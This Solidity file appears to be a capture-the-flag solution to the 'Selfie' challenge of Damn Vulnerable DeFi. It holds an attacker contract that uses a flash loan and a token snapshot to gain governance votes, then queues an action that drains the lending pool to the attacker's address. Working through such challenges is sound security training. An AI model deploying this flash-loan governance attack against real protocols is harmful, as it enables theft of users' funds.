// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "forge-std/Test.sol";

interface ISelfie {
    function flashLoan(uint256 borrowAmount) external;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);

    function transfer(address, uint256) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract AttackerContract {
    ISelfie selfieContract;
    ISimpleGovernance governanceContract;

    constructor(address selfieAddr, address governanceAddr) {
        selfieContract = ISelfie(selfieAddr);
        governanceContract = ISimpleGovernance(governanceAddr);
    }

    function exploit(uint256 amount, address attackerAddr)
        external
        returns (uint256)
    {
        //Borrow tokens from flashloan and take snapshot
        selfieContract.flashLoan(amount);
        //queue action (drain)
        uint256 weiAmount = 0;
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attackerAddr
        );
        uint256 actionId = governanceContract.queueAction(
            address(selfieContract),
            data,
            weiAmount
        );
        return (actionId);
    }

    function receiveTokens(address tokenAddr, uint256 amount) external {
        //take Snapshot
        IDamnValuableTokenSnapshot dvToken = IDamnValuableTokenSnapshot(
            tokenAddr
        );
        dvToken.snapshot();
        // Payback flashLoan
        dvToken.transfer(msg.sender, amount);
    }
}
